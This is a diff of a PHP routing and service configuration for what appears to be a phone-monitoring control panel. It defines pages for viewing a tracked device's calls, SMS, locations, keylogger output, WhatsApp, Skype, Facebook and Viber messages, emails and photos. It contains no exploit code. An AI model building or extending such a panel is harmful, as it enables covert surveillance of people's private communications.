@@ -1,8 +1,25 @@
 <?php
 
+use CS\Settings\GlobalSettings;
+use Models\Modules;
+
 $di->setShared('db', function() use ($config) {
     $pdo = new \PDO("mysql:host={$config['db']['host']};dbname={$config['db']['dbname']}", $config['db']['username'], $config['db']['password'], $config['dbOptions']);
     if ($config['environment'] == 'development') {
+        $pdo->exec("set profiling_history_size = 1000; set profiling = 1;");
+    }
+    return $pdo;
+});
+
+$di->setShared('dataDb', function() use ($di) {
+    if ($di['config']['environment'] == 'production') {
+        $dbConfig = GlobalSettings::getDeviceDatabaseConfig($di['devId']);
+    } else {
+        $dbConfig = $di['config']['dataDb'];
+    }
+    
+    $pdo = new \PDO("mysql:host={$dbConfig['host']};dbname={$dbConfig['dbname']}", $dbConfig['username'], $dbConfig['password'], $di['config']['dbOptions']);
+    if ($di['config']['environment'] == 'development') {
         $pdo->exec("set profiling_history_size = 1000; set profiling = 1;");
     }
     return $pdo;
@@ -20,30 +37,29 @@ $di->setShared('router', function() use($config) {
     $router->add('profile', new \System\Router\Route('/profile', array('controller' => 'Profile', 'action' => 'index')));
 
     $router->add('cp', new \System\Router\Route('/cp', array('controller' => 'CP', 'action' => 'main')));
-    $router->add('calls', new \System\Router\Route('/cp/calls', array('controller' => 'Calls', 'action' => 'index')));
-    $router->add('sms', new \System\Router\Route('/cp/sms', array('controller' => 'Sms', 'action' => 'index')));
-    $router->add('locations', new \System\Router\Route('/cp/locations', array('controller' => 'Locations', 'action' => 'index')));
+    $router->add(Modules::CALLS, new \System\Router\Route('/cp/calls', array('controller' => 'Calls', 'action' => 'index')));
+    $router->add(Modules::SMS, new \System\Router\Route('/cp/sms', array('controller' => 'Sms', 'action' => 'index')));
+    $router->add(Modules::LOCATIONS, new \System\Router\Route('/cp/locations', array('controller' => 'Locations', 'action' => 'index')));
+    $router->add(Modules::BROWSER_BOOKMARKS, new \System\Router\Route('/cp/bookmarks', array('controller' => 'Bookmarks', 'action' => 'index')));
+    $router->add(Modules::BROWSER_HISTORY, new \System\Router\Route('/cp/browserHistory', array('controller' => 'BrowserHistory', 'action' => 'index')));
+    $router->add(Modules::CALENDAR, new \System\Router\Route('/cp/calendar', array('controller' => 'Calendar', 'action' => 'index')));
+    $router->add(Modules::CONTACTS, new \System\Router\Route('/cp/contacts', array('controller' => 'Contacts', 'action' => 'index')));
+    $router->add(Modules::KEYLOGGER, new \System\Router\Route('/cp/keylogger', array('controller' => 'Keylogger', 'action' => 'index')));
+    $router->add(Modules::PHOTOS, new \System\Router\Route('/cp/photos', array('controller' => 'Photos', 'action' => 'index')));
+    $router->add(Modules::VIDEOS, new \System\Router\Route('/cp/videos', array('controller' => 'Videos', 'action' => 'index')));
+    $router->add(Modules::VIBER, new \System\Router\Route('/cp/viber', array('controller' => 'Viber', 'action' => 'index')));
+    $router->add(Modules::SKYPE, new \System\Router\Route('/cp/skype', array('controller' => 'Skype', 'action' => 'index')));
+    $router->add(Modules::WHATSAPP, new \System\Router\Route('/cp/whatsapp', array('controller' => 'Whatsapp', 'action' => 'index')));
+    $router->add(Modules::FACEBOOK, new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
+    $router->add(Modules::VK, new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
+    $router->add(Modules::EMAILS, new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
+    $router->add(Modules::APPLICATIONS, new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
+    $router->add(Modules::SETTINGS, new \System\Router\Route('/cp/settings', array('controller' => 'DeviceSettings', 'action' => 'index')));
+    $router->add(Modules::SMS_COMMANDS, new \System\Router\Route('/cp/smsCommands', array('controller' => 'SmsCommands', 'action' => 'index')));
     $router->add('activeDays', new \System\Router\Route('/cp/locations/activeDays', array('controller' => 'Locations', 'action' => 'disableDays')));
-    $router->add('bookmarks', new \System\Router\Route('/cp/bookmarks', array('controller' => 'Bookmarks', 'action' => 'index')));
-    $router->add('browserHistory', new \System\Router\Route('/cp/browserHistory', array('controller' => 'BrowserHistory', 'action' => 'index')));
     $router->add('browserBlocked', new \System\Router\Route('/cp/browserBlocked', array('controller' => 'BrowserHistory', 'action' => 'browserBlocked')));
-    $router->add('calendar', new \System\Router\Route('/cp/calendar', array('controller' => 'Calendar', 'action' => 'index')));
-    $router->add('contacts', new \System\Router\Route('/cp/contacts', array('controller' => 'Contacts', 'action' => 'index')));
-    $router->add('keylogger', new \System\Router\Route('/cp/keylogger', array('controller' => 'Keylogger', 'action' => 'index')));
-    $router->add('photos', new \System\Router\Route('/cp/photos', array('controller' => 'Photos', 'action' => 'index')));
-    $router->add('videos', new \System\Router\Route('/cp/videos', array('controller' => 'Videos', 'action' => 'index')));
     $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
     $router->add('videosNoCamera', new \System\Router\Route('/cp/videos/other', array('controller' => 'Videos', 'action' => 'noCamera')));
-    $router->add('viber', new \System\Router\Route('/cp/viber', array('controller' => 'Viber', 'action' => 'index')));
-    $router->add('skype', new \System\Router\Route('/cp/skype', array('controller' => 'Skype', 'action' => 'index')));
-    $router->add('whatsapp', new \System\Router\Route('/cp/whatsapp', array('controller' => 'Whatsapp', 'action' => 'index')));
-    $router->add('facebook', new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
-    $router->add('vk', new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
-    $router->add('emails', new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
-    $router->add('applications', new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
-    $router->add('settings', new \System\Router\Route('/cp/settings', array('controller' => 'DeviceSettings', 'action' => 'index')));
-    $router->add('smsCommands', new \System\Router\Route('/cp/smsCommands', array('controller' => 'SmsCommands', 'action' => 'index')));
-    $router->add('upgrade', new \System\Router\Route('/cp/upgrade', array('controller' => 'CP', 'action' => 'upgrade')));
 
     $router->add('billing', new \System\Router\Route('/billing', array('controller' => 'Billing', 'action' => 'index')));
     $router->add('billingAddDevice', new \System\Router\Route('/billing/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
@@ -66,8 +82,8 @@ $di->setShared('router', function() use($config) {
     $router->add('skypeListConference', new \System\Router\Regex('/cp/skype/:account/conference/:id', array('controller' => 'Skype', 'action' => 'conference'), array('account' => '[^/]+', 'id' => '[a-z0-9\.,\-_]+')));
     $router->add('whatsappList', new \System\Router\Regex('/cp/whatsapp/:tab/:id', array('controller' => 'Whatsapp', 'action' => 'list'), array('tab' => 'private|group', 'id' => '[0-9]+')));
     $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
-    $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[-._@a-zA-Z0-9]{6,60}')));
-    $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[-._@a-zA-Z0-9]{6,60}', 'timestamp' => '[\d]{1,10}')));
+    $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+')));//[-._@a-zA-Z0-9]{6,60}
+    $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
 
     $router->add('adminLogin', new \System\Router\Route('/admin/login', array('controller' => 'Admin', 'action' => 'login', 'public' => true)));
     $router->add('adminLostPasswordSend', new \System\Router\Route('/admin/lostPasswordSend', array('controller' => 'Admin', 'action' => 'lostPasswordSend', 'public' => true)));
@@ -117,21 +133,9 @@ $di->setShared('t', function () use ($di) {
     return $translator;
 });
 
-$di->setShared('locale', function() use($config) {
-    /*
-      if (isset($_COOKIE['locale']) && key_exists($_COOKIE['locale'], $config['locales'])) {
-      return $_COOKIE['locale'];
-      } else {
-      $locale = \System\Translator::getBestLocale(array_keys($config['locales']));
-
-      setcookie('locale', $locale, time() + 3600 * 24 * 30, '/');
-      return $locale;
-      } */
-});
-
 $di->setShared('S3', function () use ($di) {
     $s3 = new \S3($di['config']['s3']['key'], $di['config']['s3']['secret']);
-    $s3->setSigningKey($di['config']['cloudFront']['keyPairId'], $di['config']['cloudFront']['privateKeyFile']);
+    $s3->setSigningKey($di['config']['cloudFront']['keyPairId'], $di['config']['cloudFront']['privatKeyFilename']);
 
     return $s3;
 });
